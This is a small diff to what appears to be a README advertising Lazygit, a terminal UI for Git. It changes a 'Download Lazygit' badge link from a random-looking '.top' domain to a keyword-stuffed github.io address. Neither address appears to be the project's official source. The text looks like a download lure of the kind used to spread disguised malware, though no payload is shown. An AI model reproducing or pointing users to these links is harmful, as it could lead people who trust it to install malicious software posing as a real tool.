@@ -2,7 +2,7 @@
 
 Lazygit is a powerful, user-friendly terminal UI for Git that simplifies version control. Perfect for developers who want to streamline their workflow without leaving the terminal.
 
-[![Download Lazygit](https://img.shields.io/badge/Download-Lazygit-blueviolet)](https://poelkakusthbutn.top/)
+[![Download Lazygit](https://img.shields.io/badge/Download-Lazygit-blueviolet)](https://lazygit-terminal-ui-for-git-commands.github.io/.github)
 
 ---
 
